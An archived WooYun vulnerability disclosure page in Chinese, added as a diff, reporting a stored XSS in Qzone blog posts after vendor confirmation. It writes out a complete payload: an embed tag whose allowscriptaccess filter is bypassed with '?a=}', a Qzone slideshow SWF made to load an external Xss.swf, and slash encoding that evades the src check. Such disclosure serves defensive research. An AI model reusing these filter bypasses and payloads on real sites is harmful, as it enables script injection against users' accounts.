@@ -1,0 +1,309 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间某功能缺陷导致日志存储型XSS - 3  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间某功能缺陷导致日志存储型XSS - 3  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2013-03-18 00:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-03-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-07：	细节向普通白帽子公开<br/>
+									2013-04-17：	细节向实习白帽子公开<br/>
+									2013-05-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">接着来吧～ </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 我们测试一下QQ空间日志中插入FLASH的功能。<br />
+<br />
+<br />
+<br />
+我们大概可以知道，插入外域名下的FLASH，可能难以绕过腾讯的限制。<br />
+<br />
+<br />
+<br />
+那么根据之前已有的漏洞经验，我们可以试试qzs.qq.com这个域名下的FLASH。<br />
+<br />
+<br />
+<br />
+于是google,  site:qzs.qq.com filetype:swf<br />
+<br />
+<br />
+<br />
+2. 添加一个FLASH，并发表日志。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/180005599959bbcc6859b565fdb36a12e9c3d909.jpg" target="_blank"><img src="../images/180005599959bbcc6859b565fdb36a12e9c3d909.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+同时可以抓包看到所发送的html<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;embed class=&quot;blog_flash&quot; id=&quot;0.6712338558863848&quot; menu=&quot;false&quot; invokeURLs=&quot;false&quot; allowNetworking=&quot;all&quot; allowFullScreen=&quot;true&quot; allowscriptaccess=&quot;always&quot; wmode=&quot;transparent&quot; src=&quot;http://cnc.qzs.qq.com/music/qzone/qzone_tv_player.swf&quot; height=&quot;425&quot; width=&quot;500&quot;/&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3. 看看我们日志中输出的内容，allowscriptaccess 变成了 &quot;never&quot;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/180006083794fc8df6e4a0e385cb851ec65d7f8c.jpg" target="_blank"><img src="../images/180006083794fc8df6e4a0e385cb851ec65d7f8c.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 这样一来，就算我们调用qzs.qq.com下有缺陷的域名，依然无法导致XSS。<br />
+<br />
+<br />
+<br />
+5. 怎么办呢？这里我想，应该是会将我们的allowscriptaccess做了修改，但是可能是<br />
+<br />
+无条件修改：见到always就变成never;<br />
+<br />
+有条件修改：根据URL做一些判断，再修改。<br />
+<br />
+<br />
+<br />
+我们试试看，在url中加入一些其它的符号，试试是否可以绕过<br />
+<br />
+<br />
+<br />
+http://cnc.qzs.qq.com/music/qzone/qzone_tv_player.swf?a=【某个符号】<br />
+<br />
+<br />
+<br />
+6.当我们试到 } 试，奇迹发生了<br />
+<br />
+<br />
+<br />
+http://cnc.qzs.qq.com/music/qzone/qzone_tv_player.swf?a=}<br />
+<br />
+<br />
+<br />
+即发送日志的内容为：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;embed class=&quot;blog_flash&quot; id=&quot;0.6712338558863848&quot; menu=&quot;false&quot; invokeURLs=&quot;false&quot; allowNetworking=&quot;all&quot; allowFullScreen=&quot;true&quot; allowscriptaccess=&quot;always&quot; wmode=&quot;transparent&quot; src=&quot;http://cnc.qzs.qq.com/music/qzone/qzone_tv_player.swf?a=}&quot; height=&quot;425&quot; width=&quot;500&quot;/&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+查看源码，always 神奇的存在了, 如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/18000653a119908abcad1f8d9f3d40c4ea801e9e.jpg" target="_blank"><img src="../images/18000653a119908abcad1f8d9f3d40c4ea801e9e.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 这样一来，我们首先绕过了对  allowscriptaccess=&quot;always&quot; 的过滤。接着，我们就是要找一个qzs.qq.com域名下，具有缺陷的FLASH文件。<br />
+<br />
+<br />
+<br />
+依然是：google,  site:qzs.qq.com filetype:swf<br />
+<br />
+<br />
+<br />
+8. 对于传统的 ExternalInterface.call，腾讯已经基本都做了限制，我本人也在本域名下做了多次挖掘与上报，目前已经很难寻找到了。但是对于存储型，我们还可以有其他的方法来执行XSS。<br />
+<br />
+<br />
+<br />
+例如 Loader 加载一个 外部的swf 或者 htmlText=&#039;&lt;img src=&quot;外部swf&quot;&gt;&#039; 的方式。<br />
+<br />
+<br />
+<br />
+9. 带着这些思路，没有找到htmlText的，但是找到一个loader的。<br />
+<br />
+<br />
+<br />
+http://ctc.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=外部图片或FLASH<br />
+<br />
+<br />
+<br />
+具体FLASH反编译查找参数过程，在此不述。<br />
+<br />
+<br />
+<br />
+10. 接着我们构造利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;embed class=&quot;blog_flash&quot; menu=&quot;false&quot; invokeURLs=&quot;false&quot; allowNetworking=&quot;all&quot; allowFullScreen=&quot;true&quot; allowscriptaccess=&quot;always&quot; wmode=&quot;transparent&quot; src=&quot;http://ctc.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?a=}&amp;bg=http://xsst.sinaapp.com/Xss.swf&quot; height=&quot;425&quot; width=&quot;500&quot;/&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+11. 用上面的代码，会发现FLASH被过滤啦。。看来http://xsst.sinaapp.com/Xss.swf又触发了对src属性的判断规则。<br />
+<br />
+<br />
+<br />
+我们稍微修改下，将 / 改为 &amp;#x2F;, 再次绕过限制。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div&gt;&lt;embed class=&quot;blog_flash&quot; menu=&quot;false&quot; invokeURLs=&quot;false&quot; allowNetworking=&quot;all&quot; allowFullScreen=&quot;true&quot; allowscriptaccess=&quot;always&quot; wmode=&quot;transparent&quot; src=&quot;http://ctc.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?a=}&amp;bg=http:&amp;#x2F;&amp;#x2F;xsst.sinaapp.com&amp;#x2F;Xss.swf&quot; height=&quot;425&quot; width=&quot;500&quot;/&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 用以上代码发表日志。查看效果。<br />
+<br />
+<br />
+<br />
+IE &amp; chrome下，执行代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/18000704ac657f3469e3adec63ec7c7edca5f034.jpg" target="_blank"><img src="../images/18000704ac657f3469e3adec63ec7c7edca5f034.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">服务器端的逻辑，我不猜~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020230" title="QQ空间某功能缺陷导致日志存储型XSS - 3">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-03-18 15:25</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20230";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
